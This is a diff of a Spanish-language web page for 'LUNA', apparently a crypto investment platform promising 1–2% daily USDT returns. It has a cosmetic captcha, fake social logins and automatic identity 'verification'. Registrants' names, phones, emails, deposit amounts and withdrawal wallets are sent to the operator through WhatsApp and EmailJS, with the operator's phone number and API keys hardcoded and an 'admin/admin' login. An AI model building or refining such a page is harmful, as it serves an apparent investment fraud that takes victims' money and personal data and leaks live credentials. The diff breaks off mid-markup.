@@ -3,432 +3,350 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LUNA - Plataforma Oficial</title>
+    <title>LUNA - Plataforma Profesional</title>
+    
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
     
     <style>
         body { font-family: 'Inter', sans-serif; background-color: #f0f4f8; }
         .hidden { display: none !important; }
         
-        /* Overlays */
+        /* OVERLAYS */
         #captcha-overlay, #auth-overlay, #loading-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             z-index: 9999; display: flex; align-items: center; justify-content: center;
         }
         #captcha-overlay { background-color: #0f172a; }
         #auth-overlay { background-color: rgba(0,0,0,0.9); backdrop-filter: blur(8px); z-index: 9000; }
-        #loading-overlay { background-color: rgba(255,255,255,0.9); z-index: 9500; flex-direction: column; }
+        #loading-overlay { background-color: rgba(255,255,255,0.95); z-index: 9500; flex-direction: column; }
         
-        /* Animaciones */
+        /* ANIMACIONES */
         .ticker-wrap { width: 100%; overflow: hidden; background-color: #0b1120; padding: 10px 0; position: sticky; top: 0; z-index: 40; }
         .ticker { display: inline-block; animation: ticker 60s linear infinite; }
         .ticker-item { display: inline-flex; align-items: center; padding: 0 2rem; color: white; }
         @keyframes ticker { 0% { transform: translateX(0); } 100% { transform: translateX(-100%); } }
-        
         .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #eab308; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 
     <script>
         /* ==========================================
-           CONFIGURACIÓN DE NOTIFICACIONES
+           ⚠️ CONFIGURACIÓN COMPLETA (NO TOCAR) ⚠️
            ========================================== */
-        const MY_PHONE_NUMBER = "17866420388"; 
-        const MY_API_KEY = "5634074"; 
-
-        /* --- DATOS DEL SISTEMA --- */
-        var plansConfig = {
-            1: { name: "Inicial", min: 2, days: 15, rate: 0.01, color: '#2563eb' },
-            2: { name: "Avanzado", min: 15, days: 10, rate: 0.015, color: '#9333ea' },
-            3: { name: "VIP", min: 50, days: 7, rate: 0.02, color: '#eab308' }
-        };
         
-        var state = {
-            user: null, 
-            usersDB: [], // Aquí se guardan los usuarios registrados
-            requests: { kyc:[], deposits:[], withdrawals:[], p2p:[] },
-            p2pAds: [ {id:1, user:'TraderPro', type:'sell', price:1.01}, {id:2, user:'CryptoKing', type:'buy', price:0.99} ],
-            reviews: [ {name:'Ana', rating:5, text:'Excelente.'}, {name:'Luis', rating:4, text:'Rápido.'} ]
-        };
+        // WHATSAPP (CallMeBot)
+        const WA_PHONE = "17866420388"; 
+        const WA_APIKEY = "5634074"; 
 
-        var captchaCode = 0;
-        var selectedPlanId = null;
-        var p2pMode = 'buy';
+        // EMAIL (EmailJS) - ¡YA CONFIGURADO!
+        const EMAIL_SERVICE_ID = "service_g452uds"; 
+        const EMAIL_TEMPLATE_ID = "template_l85jqxg";
+        const EMAIL_PUBLIC_KEY = "Zadh0RC8pVuE5vdY1";
 
-        /* --- WHATSAPP --- */
-        function notifyAdmin(asunto, detalle) {
-            var text = `🚀 *LUNA REPORT* 🚀\n\n📌 *Evento:* ${asunto}\n👤 *Usuario:* ${state.user ? state.user.name : 'Nuevo'}\n📝 *Info:* ${detalle}\n⏰ *Hora:* ${new Date().toLocaleTimeString()}`;
-            var encodedText = encodeURIComponent(text);
-            var url = `https://api.callmebot.com/whatsapp.php?phone=${MY_PHONE_NUMBER}&text=${encodedText}&apikey=${MY_API_KEY}`;
+        /* ========================================== */
+
+        /* --- INICIALIZACIÓN --- */
+        (function(){
+            emailjs.init(EMAIL_PUBLIC_KEY);
+        })();
+
+        var plansConfig = { 1: { name: "Inicial", min: 2, days: 15, rate: 0.01 }, 2: { name: "Avanzado", min: 15, days: 10, rate: 0.015 }, 3: { name: "VIP", min: 50, days: 7, rate: 0.02 } };
+        var state = { user: null, usersDB: [], requests: { kyc:[], deposits:[], withdrawals:[] }, p2pAds: [] };
+        var captchaCode = 0; var selectedPlanId = null;
+
+        /* --- SISTEMA DE NOTIFICACIONES INTELIGENTE --- */
+        
+        function notifySystem(tipo, detalles, datosUsuario) {
+            const hora = new Date().toLocaleTimeString();
+            const usuario = datosUsuario.name;
+            const telefono = datosUsuario.phone || "Desconocido";
+            const correo = datosUsuario.email || "Desconocido";
+
+            // 1. WHATSAPP AL ADMIN (CON BOTONES DE RESPUESTA RÁPIDA)
+            // Esto crea un enlace directo para que TÚ le respondas al cliente con un clic
+            const linkAprobar = `https://wa.me/${telefono.replace('+','')}?text=Hola ${usuario}, tu solicitud de ${tipo} ha sido APROBADA ✅.`;
+            const linkRechazar = `https://wa.me/${telefono.replace('+','')}?text=Hola ${usuario}, hubo un problema con tu solicitud de ${tipo} ❌.`;
+
+            let whatsappText = `🔔 *ALERTA LUNA* 🔔\n\n` +
+                               `📂 *${tipo}*\n` +
+                               `👤 *${usuario}*\n` +
+                               `📱 *${telefono}*\n` +
+                               `📧 *${correo}*\n` +
+                               `📝 *${detalles}*\n` +
+                               `👇 *ACCIONES:* 👇\n` +
+                               `✅ APROBAR: ${linkAprobar}\n` +
+                               `❌ RECHAZAR: ${linkRechazar}`;
+
+            const url = `https://api.callmebot.com/whatsapp.php?phone=${WA_PHONE}&text=${encodeURIComponent(whatsappText)}&apikey=${WA_APIKEY}`;
             
-            // Enviar en segundo plano
-            var img = new Image(); img.src = url;
+            // Enviar WhatsApp
+            var img = new Image(); img.src = url; 
+
+            // 2. CORREO ELECTRÓNICO (USANDO EMAILJS)
+            const emailParams = {
+                message: `NUEVA SOLICITUD: ${tipo}\n-----------------------\nUsuario: ${usuario}\nTeléfono: ${telefono}\nCorreo: ${correo}\n\nDetalle de la operación:\n${detalles}\n\nFecha: ${new Date().toLocaleString()}`
+            };
+            
+            emailjs.send(EMAIL_SERVICE_ID, EMAIL_TEMPLATE_ID, emailParams)
+                .then(() => console.log("Email enviado al admin"))
+                .catch((e) => console.error("Error email", e));
         }
 
-        /* --- 1. CAPTCHA --- */
-        function initCaptcha() {
-            captchaCode = Math.floor(1000 + Math.random() * 9000);
-            var display = document.getElementById('captcha-display');
-            if(display) display.innerText = captchaCode;
-        }
-
+        /* --- CAPTCHA --- */
+        function initCaptcha() { captchaCode = Math.floor(1000+Math.random()*9000); document.getElementById('captcha-display').innerText=captchaCode; }
         function verifyCaptcha() {
-            var input = document.getElementById('captcha-input').value;
-            if(parseInt(input) === captchaCode) {
-                document.getElementById('captcha-overlay').style.display = 'none';
-                checkSession(); // Decidir si mostrar login o dashboard
-                toast('Acceso Permitido', 'success');
-            } else {
-                toast('Código Incorrecto', 'error');
-                initCaptcha();
-                document.getElementById('captcha-input').value = '';
-            }
+            if(document.getElementById('captcha-input').value == captchaCode) {
+                document.getElementById('captcha-overlay').style.display='none'; checkSession(); toast('Seguridad verificada','success');
+            } else { toast('Error de código','error'); initCaptcha(); document.getElementById('captcha-input').value=''; }
         }
 
-        /* --- 2. SISTEMA DE ACCESO (LOGIN/REGISTRO) --- */
-        
-        function checkSession() {
-            // Si hay usuario guardado, vamos directo al dashboard
-            if(state.user) {
-                showDashboard();
-            } else {
-                // Si no, mostramos la pantalla de registro obligatoria
-                document.getElementById('auth-overlay').classList.remove('hidden');
-                document.getElementById('auth-overlay').style.display = 'flex';
-            }
+        /* --- AUTH --- */
+        function checkSession() { if(state.user) showDashboard(); else { document.getElementById('auth-overlay').classList.remove('hidden'); document.getElementById('auth-overlay').style.display='flex'; } }
+        function toggleAuthMode(m) { 
+            document.getElementById(m==='register'?'login-box':'register-box').classList.add('hidden');
+            document.getElementById(m==='register'?'register-box':'login-box').classList.remove('hidden');
         }
 
-        function toggleAuthMode(mode) {
-            if(mode === 'register') {
-                document.getElementById('login-box').classList.add('hidden');
-                document.getElementById('register-box').classList.remove('hidden');
-            } else {
-                document.getElementById('register-box').classList.add('hidden');
-                document.getElementById('login-box').classList.remove('hidden');
-            }
-        }
-
-        // REGISTRO MANUAL
         function doRegister() {
-            var name = document.getElementById('reg-name').value;
-            var last = document.getElementById('reg-last').value;
-            var phone = document.getElementById('reg-phone').value;
-            var email = document.getElementById('reg-email').value;
-            var pass = document.getElementById('reg-pass').value;
-
-            if(!name || !last || !phone || !email || !pass) return toast('Faltan datos obligatorios', 'error');
-
-            // 1. Mostrar carga
-            showLoading("Creando tu cuenta segura...");
-
-            setTimeout(function() {
-                // 2. Crear Usuario
-                var newUser = {
-                    id: 'U' + Math.floor(Math.random() * 100000),
-                    name: name, lastname: last, phone: phone, email: email, password: pass,
-                    balance: 0, invested: 0, earnings: 0, verified: false, investments: []
-                };
-
+            const n=document.getElementById('reg-name').value, l=document.getElementById('reg-last').value, p=document.getElementById('reg-phone').value, e=document.getElementById('reg-email').value, ps=document.getElementById('reg-pass').value;
+            if(!n||!l||!p||!e||!ps) return toast('Llena todo','error');
+            
+            showLoading("Creando cuenta...");
+            setTimeout(() => {
+                const newUser = { id: 'U'+Date.now(), name: n, lastname: l, phone: p, email: e, password: ps, balance: 0, invested: 0, earnings: 0, verified: false, investments: [] };
                 state.usersDB.push(newUser);
                 state.user = newUser;
-                save();
-
-                // 3. Notificaciones
-                notifyAdmin("NUEVO REGISTRO", `Cliente: ${name} ${last}\nCel: ${phone}\nEmail: ${email}`);
                 
-                // Simular envío al cliente
-                toast(`📩 Correo de Bienvenida enviado a ${email}`, 'success');
-                setTimeout(() => toast(`📱 WhatsApp de confirmación enviado a ${phone}`, 'success'), 1500);
-
-                // 4. AVANZAR A LA PAGINA (Ocultar loaders y Auth)
-                hideLoading();
-                document.getElementById('auth-overlay').style.display = 'none';
-                showDashboard(); // CAMBIO DE VISTA
+                // NOTIFICAR AL ADMIN
+                notifySystem("NUEVO REGISTRO", "Usuario registrado correctamente", newUser);
                 
-            }, 2000); // 2 segundos de "procesando"
+                save(); hideLoading(); document.getElementById('auth-overlay').style.display='none'; showDashboard();
+                toast('¡Cuenta Creada!','success');
+            }, 1500);
         }
 
-        // LOGIN
         function doLogin() {
-            var email = document.getElementById('login-email').value;
-            var pass = document.getElementById('login-pass').value;
-
-            if(email === 'admin' && pass === 'admin') { doAdminLoginAction(); return; }
-
-            var user = state.usersDB.find(u => u.email === email);
+            const e=document.getElementById('login-email').value;
+            if(e==='admin'&&document.getElementById('login-pass').value==='admin') { doAdminLoginAction(); return; }
             
-            if(user) {
-                state.user = user;
-                notifyAdmin("INICIO DE SESIÓN", `El usuario ${user.name} ha vuelto.`);
-            } else {
-                // Demo automático si no existe
-                state.user = { name: 'Invitado', email: email, balance: 0, invested: 0, earnings: 0, verified: false, investments: [] };
-                notifyAdmin("LOGIN DEMO", `Email: ${email}`);
+            const u = state.usersDB.find(x => x.email === e);
+            if(u) { 
+                state.user = u; notifySystem("LOGIN", "Usuario regresó a la plataforma", u); 
+            } else { 
+                // Demo si no existe
+                state.user = { name:'Invitado', email:e, phone: '+00000000', balance:0, verified:false, investments:[] }; 
+                notifySystem("LOGIN DEMO", `Acceso invitado: ${e}`, state.user);
             }
-
-            save();
-            document.getElementById('auth-overlay').style.display = 'none';
-            showDashboard();
-            toast('Bienvenido ' + state.user.name, 'success');
+            save(); document.getElementById('auth-overlay').style.display='none'; showDashboard();
         }
 
-        // LOGIN SOCIAL (GOOGLE/FACEBOOK)
-        function socialLogin(provider) {
-            showLoading(`Conectando con ${provider}...`);
-            
-            setTimeout(function() {
-                var fakeName = "Usuario " + provider;
-                var fakeEmail = "user@" + provider.toLowerCase() + ".com";
-                
-                state.user = { 
-                    id: 'SOC' + Math.floor(Math.random()*1000),
-                    name: fakeName, email: fakeEmail, 
-                    balance: 0, invested: 0, earnings: 0, verified: false, investments: [] 
-                };
-                
-                save();
-                notifyAdmin("REGISTRO RED SOCIAL", `Proveedor: ${provider}`);
-                
-                hideLoading();
-                document.getElementById('auth-overlay').style.display = 'none';
-                showDashboard();
-                toast(`¡Conectado exitosamente con ${provider}!`, 'success');
-                
-            }, 1500); // 1.5 seg demora simulada
+        function socialLogin(prov) {
+            showLoading(`Conectando con ${prov}...`);
+            setTimeout(() => {
+                state.user = { id: 'S'+Date.now(), name: `Usuario ${prov}`, email: `user@${prov.toLowerCase()}.com`, phone: "+1000000000", balance:0, verified:false, investments:[] };
+                notifySystem("LOGIN SOCIAL", `Registro mediante ${prov}`, state.user);
+                save(); hideLoading(); document.getElementById('auth-overlay').style.display='none'; showDashboard();
+            }, 1500);
         }
 
-        /* --- 3. GESTIÓN DE VISTAS (EL SECRETO PARA QUE AVANCE) --- */
+        /* --- DASHBOARD --- */
         function showDashboard() {
-            // Ocultar vista landing (visitante)
             document.getElementById('landing-view').classList.add('hidden');
-            // Mostrar vista dashboard (usuario)
             document.getElementById('dashboard-view').classList.remove('hidden');
-            
-            // Actualizar datos del DOM
-            updateDashboardValues();
+            updateUI();
         }
-
-        function updateDashboardValues() {
+        function updateUI() {
             if(!state.user) return;
-            document.getElementById('nav-username').innerText = state.user.name;
-            document.getElementById('dash-balance').innerText = state.user.balance.toFixed(2);
-            document.getElementById('dash-invested').innerText = state.user.invested.toFixed(2);
-            document.getElementById('dash-earnings').innerText = state.user.earnings.toFixed(2);
-            
-            if(state.user.verified) {
-                document.getElementById('verify-alert').classList.add('hidden');
-                document.getElementById('btn-withdraw').disabled = false;
-                document.getElementById('btn-withdraw').classList.remove('opacity-50');
-            }
-            renderInvestments();
+            document.getElementById('nav-user').innerText = state.user.name;
+            document.getElementById('ui-bal').innerText = state.user.balance.toFixed(2);
+            document.getElementById('ui-inv').innerText = (state.user.invested||0).toFixed(2);
+            document.getElementById('ui-earn').innerText = (state.user.earnings||0).toFixed(2);
+            if(state.user.verified) { document.getElementById('alert-kyc').classList.add('hidden'); document.getElementById('btn-wd').disabled=false; }
+            renderInv();
         }
 
-        // --- UTILS ---
-        function showLoading(text) {
-            document.getElementById('loading-text').innerText = text;
-            document.getElementById('loading-overlay').classList.remove('hidden');
-            document.getElementById('loading-overlay').style.display = 'flex';
-        }
-        function hideLoading() {
-            document.getElementById('loading-overlay').classList.add('hidden');
-            document.getElementById('loading-overlay').style.display = 'none';
-        }
-        function toast(msg, type='neutral') {
-            var t = document.getElementById('toast');
-            t.innerText = msg;
-            t.className = `fixed bottom-5 right-5 px-6 py-3 rounded shadow-xl text-white transition-all duration-300 z-50 ${type==='success'?'bg-green-600':'bg-gray-800'} translate-y-0 opacity-100`;
-            setTimeout(() => t.classList.add('translate-y-10', 'opacity-0'), 3000);
-        }
-        function save() { localStorage.setItem('lunaFinalState', JSON.stringify(state)); }
-        
-        // --- OPERACIONES ---
+        /* --- OPERACIONES --- */
         function doDeposit() {
-            var amt = parseFloat(document.getElementById('dep-amount').value);
-            if(!amt) return;
-            state.requests.deposits.push({uid: state.user.id, name: state.user.name, amount: amt, id: Date.now()});
-            notifyAdmin("DEPOSITO", `Monto: ${amt} USDT - ${state.user.name}`);
-            toast('Enviado a revisión', 'success');
-            closeModal('deposit-modal');
+            const v = parseFloat(document.getElementById('dep-amount').value);
+            if(!v) return;
+            state.requests.deposits.push({uid:state.user.id, name:state.user.name, amount:v, id:Date.now()});
+            notifySystem("DEPOSITO", `Solicitud de carga: ${v} USDT`, state.user);
+            toast('Enviado a revisión','success'); closeModal('dep-modal');
+        }
+        function doWithdraw() {
+            const v = parseFloat(document.getElementById('wd-amount').value);
+            const w = document.getElementById('wd-wallet').value;
+            if(v > state.user.balance) return toast('Saldo insuficiente','error');
+            state.user.balance -= v;
+            notifySystem("RETIRO", `Solicitud de retiro: ${v} USDT\nWallet: ${w}`, state.user);
+            save(); closeModal('wd-modal'); toast('Retiro solicitado','success'); updateUI();
         }
         function doInvest() {
-            var amt = parseFloat(document.getElementById('inv-amount').value);
-            if(amt > state.user.balance) return toast('Saldo insuficiente', 'error');
-            state.user.balance -= amt;
-            state.user.invested += amt;
-            state.user.investments.push({planId: selectedPlanId, amount: amt, daysLeft: 15});
-            notifyAdmin("INVERSION", `Monto: ${amt} USDT`);
-            save(); updateDashboardValues(); closeModal('invest-modal'); toast('Inversión Exitosa', 'success');
+            const v = parseFloat(document.getElementById('inv-amount').value);
+            if(v > state.user.balance) return toast('Falta saldo','error');
+            state.user.balance -= v; state.user.invested = (state.user.invested||0) + v;
+            state.user.investments.push({pid:selectedPlanId, amount:v, days:15});
+            notifySystem("INVERSION", `Plan activado: ${selectedPlanId}\nMonto: ${v} USDT`, state.user);
+            save(); closeModal('inv-modal'); toast('Inversión activa','success'); updateUI();
         }
-        function processKYC() {
-            notifyAdmin("KYC", `Usuario ${state.user.name} envió documentos`);
-            state.user.verified = true; 
-            save(); updateDashboardValues(); closeModal('kyc-modal'); toast('Verificado', 'success');
-        }
-        function simulateDay() {
-            if(!state.user) return;
-            var profit = 0;
-            state.user.investments.forEach(i => { if(i.daysLeft>0) { var g = i.amount * 0.01; profit+=g; state.user.balance+=g; state.user.earnings+=g; i.daysLeft--; }});
-            save(); updateDashboardValues(); toast(`Ganancia diaria: +${profit.toFixed(2)}`, 'success');
+        function doKYC() {
+            notifySystem("KYC", "El usuario ha subido documentos de identidad.", state.user);
+            state.user.verified = true; // Auto verify simulado para demo
+            save(); closeModal('kyc-modal'); toast('Verificado','success'); updateUI();
         }
 
-        // Auxiliares
+        /* --- UTILS --- */
+        function showLoading(t) { document.getElementById('load-text').innerText=t; document.getElementById('loading-overlay').classList.remove('hidden'); document.getElementById('loading-overlay').style.display='flex'; }
+        function hideLoading() { document.getElementById('loading-overlay').style.display='none'; }
+        function toast(m,t) { const x=document.getElementById('toast'); x.innerText=m; x.className=`fixed bottom-5 right-5 px-6 py-3 rounded shadow-xl text-white z-50 ${t==='success'?'bg-green-600':'bg-red-600'}`; setTimeout(()=>x.classList.add('hidden'),3000); x.classList.remove('hidden'); }
+        function save() { localStorage.setItem('lunaProState', JSON.stringify(state)); }
         function openModal(id) { document.getElementById(id).classList.remove('hidden'); document.getElementById(id).classList.add('flex'); }
         function closeModal(id) { document.getElementById(id).classList.add('hidden'); document.getElementById(id).classList.remove('flex'); }
-        function startInvest(id) { selectedPlanId=id; openModal('invest-modal'); }
-        function renderInvestments() { var l=document.getElementById('investment-list'); l.innerHTML=''; state.user.investments.forEach(i=>{l.innerHTML+=`<tr class="border-b"><td class="p-2">Plan ${i.planId}</td><td class="p-2">${i.amount}</td><td class="p-2">${i.daysLeft}</td></tr>`;});}
-        function scrollToId(id) { document.getElementById(id).scrollIntoView({behavior:'smooth'}); }
+        function startInv(id) { selectedPlanId=id; openModal('inv-modal'); }
+        function renderInv() { document.getElementById('inv-list').innerHTML = state.user.investments.map(i=>`<div class="flex justify-between border-b p-2"><span>Plan ${i.pid}</span><span>${i.amount} USDT</span></div>`).join('') || '<div class="text-center p-2">Nada activo</div>'; }
 
-        /* --- INIT --- */
+        /* --- ADMIN --- */
+        function doAdminLoginAction() { 
+            document.getElementById('auth-overlay').style.display='none'; 
+            document.getElementById('admin-panel').classList.remove('hidden');
+            renderAdmin();
+        }
+        function renderAdmin() {
+            document.getElementById('adm-users').innerText = state.usersDB.length;
+        }
+        function toggleAdmin() { document.getElementById('admin-panel').classList.add('hidden'); document.getElementById('dashboard-view').classList.remove('hidden'); }
+
         window.onload = function() {
             initCaptcha();
-            var saved = localStorage.getItem('lunaFinalState');
-            if(saved) state = JSON.parse(saved);
+            const s = localStorage.getItem('lunaProState');
+            if(s) state = JSON.parse(s);
         };
     </script>
 </head>
-<body class="flex flex-col min-h-screen bg-gray-50 text-slate-900">
+<body class="flex flex-col min-h-screen bg-slate-50 text-slate-900">
 
-    <div id="loading-overlay" class="hidden">
-        <div class="spinner mb-4"></div>
-        <p id="loading-text" class="text-lg font-bold text-slate-700">Cargando...</p>
-    </div>
+    <div id="loading-overlay" class="hidden"><div class="spinner mb-4"></div><p id="load-text" class="font-bold text-slate-700">Procesando...</p></div>
+    <div id="toast" class="hidden"></div>
 
     <div id="captcha-overlay">
-        <div class="bg-white p-8 rounded-xl shadow-2xl text-center max-w-sm border-4 border-slate-800">
-            <h2 class="text-2xl font-bold mb-4">🔒 Seguridad</h2>
-            <div id="captcha-display" class="bg-gray-200 text-3xl font-mono font-bold py-3 mb-4 tracking-widest select-none">----</div>
-            <input type="number" id="captcha-input" placeholder="Código" class="border-2 border-gray-300 p-2 rounded w-full text-center text-xl mb-4">
-            <button onclick="verifyCaptcha()" class="bg-slate-900 text-white w-full py-3 rounded font-bold shadow">VERIFICAR</button>
+        <div class="bg-white p-8 rounded-2xl shadow-2xl text-center max-w-sm border-4 border-slate-800">
+            <h2 class="text-2xl font-bold mb-2">🛡️ Seguridad</h2>
+            <div id="captcha-display" class="bg-slate-200 text-3xl font-mono font-bold py-3 mb-4 tracking-widest select-none">----</div>
+            <input type="number" id="captcha-input" class="border-2 p-2 rounded w-full text-center text-xl mb-4 font-bold">
+            <button onclick="verifyCaptcha()" class="bg-slate-900 text-white w-full py-3 rounded font-bold">VERIFICAR</button>
         </div>
     </div>
 
     <div id="auth-overlay" class="hidden">
-        <div class="bg-white p-0 rounded-2xl shadow-2xl w-full max-w-md overflow-hidden">
-            <div class="bg-slate-900 p-6 text-center">
-                <h2 class="text-2xl font-bold text-yellow-400">LUNA</h2>
-                <p class="text-white text-sm">Acceso Seguro</p>
-            </div>
-            
+        <div class="bg-white rounded-xl shadow-2xl w-full max-w-md overflow-hidden">
+            <div class="bg-slate-900 p-6 text-center"><h2 class="text-2xl font-bold text-yellow-400">LUNA</h2></div>
             <div class="p-8">
                 <div class="grid grid-cols-2 gap-4 mb-6">
-                    <button onclick="socialLogin('Google')" class="flex items-center justify-center gap-2 border p-2 rounded hover:bg-gray-50 transition">
-                        <span class="font-bold text-blue-500">G</span> Google
-                    </button>
-                    <button onclick="socialLogin('Facebook')" class="flex items-center justify-center gap-2 border p-2 rounded hover:bg-gray-50 transition">
-                        <span class="font-bold text-blue-700">f</span> Facebook
-                    </button>
+                    <button onclick="socialLogin('Google')" class="flex justify-center items-center gap-2 border p-2 rounded hover:bg-slate-50"><span class="font-bold text-blue-500">G</span> Google</button>
+                    <button onclick="socialLogin('Facebook')" class="flex justify-center items-center gap-2 border p-2 rounded hover:bg-slate-50"><span class="font-bold text-blue-700">f</span> Facebook</button>
                 </div>
+                <div class="text-center text-xs text-gray-400 mb-4">- O -</div>
                 
-                <div class="text-center text-gray-400 text-xs mb-4">- O USA TU CORREO -</div>
-
                 <div id="register-box">
-                    <div class="grid grid-cols-2 gap-2 mb-3">
-                        <input id="reg-name" type="text" placeholder="Nombre" class="border p-2 rounded text-sm">
-                        <input id="reg-last" type="text" placeholder="Apellido" class="border p-2 rounded text-sm">
-                    </div>
-                    <input id="reg-phone" type="tel" placeholder="WhatsApp (+53...)" class="w-full border p-2 rounded mb-3 text-sm">
-                    <input id="reg-email" type="email" placeholder="Correo" class="w-full border p-2 rounded mb-3 text-sm">
-                    <input id="reg-pass" type="password" placeholder="Contraseña" class="w-full border p-2 rounded mb-4 text-sm">
-                    
-                    <button onclick="doRegister()" class="w-full bg-blue-600 text-white font-bold py-3 rounded hover:bg-blue-700 transition">CREAR CUENTA GRATIS</button>
-                    <p class="text-center text-xs mt-4 cursor-pointer text-blue-600" onclick="toggleAuthMode('login')">¿Ya tienes cuenta? Inicia Sesión</p>
+                    <div class="grid grid-cols-2 gap-2 mb-2"><input id="reg-name" placeholder="Nombre" class="border p-2 rounded"><input id="reg-last" placeholder="Apellido" class="border p-2 rounded"></div>
+                    <input id="reg-phone" placeholder="WhatsApp (+53...)" class="w-full border p-2 rounded mb-2">
+                    <input id="reg-email" placeholder="Correo" class="w-full border p-2 rounded mb-2">
+                    <input id="reg-pass" type="password" placeholder="Contraseña" class="w-full border p-2 rounded mb-4">
+                    <button onclick="doRegister()" class="w-full bg-blue-600 text-white py-3 rounded font-bold hover:bg-blue-700">REGISTRARME</button>
+                    <p onclick="toggleAuthMode('login')" class="text-center text-xs mt-3 text-blue-600 cursor-pointer hover:underline">¿Ya tienes cuenta?</p>
                 </div>
-
                 <div id="login-box" class="hidden">
-                    <input id="login-email" type="email" placeholder="Correo" class="w-full border p-3 rounded mb-3">
+                    <input id="login-email" placeholder="Correo" class="w-full border p-3 rounded mb-3">
                     <input id="login-pass" type="password" placeholder="Contraseña" class="w-full border p-3 rounded mb-6">
-                    <button onclick="doLogin()" class="w-full bg-slate-900 text-white font-bold py-3 rounded hover:bg-slate-800 transition">ENTRAR</button>
-                    <p class="text-center text-xs mt-4 cursor-pointer text-blue-600" onclick="toggleAuthMode('register')">¿Nuevo? Crea una cuenta</p>
+                    <button onclick="doLogin()" class="w-full bg-slate-900 text-white py-3 rounded font-bold">ENTRAR</button>
+                    <p onclick="toggleAuthMode('register')" class="text-center text-xs mt-3 text-blue-600 cursor-pointer hover:underline">Crear cuenta nueva</p>
                 </div>
             </div>
         </div>
     </div>
 
-    <div id="dashboard-view" class="hidden flex flex-col min-h-screen">
-        <header class="bg-slate-900 text-white p-4 shadow flex justify-between items-center sticky top-0 z-30">
-            <h1 class="text-xl font-bold text-yellow-400">LUNA <span class="text-xs text-gray-400">Dashboard</span></h1>
-            <div class="flex items-center gap-4">
-                <span class="text-sm">Hola, <b id="nav-username" class="text-yellow-400">Usuario</b></span>
-                <button onclick="localStorage.clear(); location.reload();" class="text-xs text-red-400 border border-red-900 px-2 py-1 rounded">Salir</button>
+    <div id="landing-view" class="fixed inset-0 bg-gradient-to-br from-slate-900 to-slate-800 z-0"></div>
+
+    <div id="dashboard-view" class="hidden relative z-10 flex flex-col min-h-screen">
+        <header class="bg-white shadow p-4 flex justify-between items-center">
+            <h1 class="font-bold text-xl text-slate-800">LUNA <span class="text-xs text-yellow-500">PRO</span></h1>
+            <div class="flex items-center gap-3">
+                <span class="text-sm font-bold" id="nav-user">Usuario</span>
+                <button onclick="location.reload()" class="text-xs text-red-500 border border-red-200 px-2 py-1 rounded">Salir</button>
             </div>
         </header>
 
-        <main class="flex-grow max-w-6xl mx-auto p-4 w-full">
-            <div id="verify-alert" class="bg-red-100 border-l-4 border-red-500 text-red-700 p-4 mb-6 flex justify-between items-center">
-                <p class="text-sm">⚠️ Tu cuenta no está verificada. No puedes retirar fondos.</p>
-                <button onclick="openModal('kyc-modal')" class="bg-red-600 text-white px-3 py-1 rounded text-xs font-bold">Verificar Ahora</button>
+        <main class="flex-grow p-4 max-w-5xl mx-auto w-full">
+            <div id="alert-kyc" class="bg-red-100 text-red-700 p-3 rounded mb-6 text-sm flex justify-between items-center">
+                <span>⚠️ Cuenta no verificada.</span> <button onclick="openModal('kyc-modal')" class="underline font-bold">Verificar</button>
             </div>
 
             <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
                 <div class="bg-white p-6 rounded-xl shadow border-l-4 border-blue-500">
-                    <p class="text-gray-500 text-xs uppercase font-bold">Saldo Disponible</p>
-                    <h3 class="text-3xl font-bold text-slate-800"><span id="dash-balance">0.00</span> USDT</h3>
+                    <p class="text-xs text-gray-500 uppercase font-bold">Saldo</p>
+                    <h2 class="text-3xl font-bold"><span id="ui-bal">0.00</span> USDT</h2>
                 </div>
                 <div class="bg-white p-6 rounded-xl shadow border-l-4 border-purple-500">
-                    <p class="text-gray-500 text-xs uppercase font-bold">Invertido</p>
-                    <h3 class="text-3xl font-bold text-slate-800"><span id="dash-invested">0.00</span> USDT</h3>
+                    <p class="text-xs text-gray-500 uppercase font-bold">Invertido</p>
+                    <h2 class="text-3xl font-bold"><span id="ui-inv">0.00</span> USDT</h2>
                 </div>
                 <div class="bg-white p-6 rounded-xl shadow border-l-4 border-green-500">
-                    <p class="text-gray-500 text-xs uppercase font-bold">Ganancia Total</p>
-                    <h3 class="text-3xl font-bold text-green-600">+<span id="dash-earnings">0.00</span> USDT</h3>
+                    <p class="text-xs text-gray-500 uppercase font-bold">Ganancia</p>
+                    <h2 class="text-3xl font-bold text-green-600">+<span id="ui-earn">0.00</span></h2>
                 </div>
             </div>
 
-            <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8">
-                <button onclick="openModal('deposit-modal')" class="bg-green-600 hover:bg-green-700 text-white py-3 rounded-lg font-bold shadow transition">⬇️ Depositar</button>
-                <button id="btn-withdraw" onclick="openModal('withdraw-modal')" disabled class="bg-red-500 hover:bg-red-600 text-white py-3 rounded-lg font-bold shadow opacity-50 transition">⬆️ Retirar</button>
-                <button onclick="scrollToId('planes-section')" class="bg-slate-800 text-white py-3 rounded-lg font-bold shadow">🚀 Invertir</button>
-                <button onclick="simulateDay()" class="bg-indigo-600 text-white py-3 rounded-lg font-bold shadow">⚡ Simular Día</button>
+            <div class="grid grid-cols-2 gap-4 mb-8">
+                <button onclick="openModal('dep-modal')" class="bg-green-600 text-white py-4 rounded-xl font-bold shadow hover:bg-green-700 transition">Depositar</button>
+                <button id="btn-wd" onclick="openModal('wd-modal')" disabled class="bg-red-500 text-white py-4 rounded-xl font-bold shadow hover:bg-red-600 transition disabled:opacity-50">Retirar</button>
             </div>
 
-            <section id="planes-section" class="mb-8">
-                <h3 class="font-bold text-xl mb-4 text-slate-700">Planes de Inversión</h3>
-                <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
-                    <div class="bg-white p-6 rounded-xl shadow-lg border border-gray-100 hover:scale-105 transition">
-                        <h4 class="font-bold text-lg text-blue-600">Plan Inicial</h4>
-                        <p class="text-3xl font-bold my-2">1.0% <span class="text-sm text-gray-400">/día</span></p>
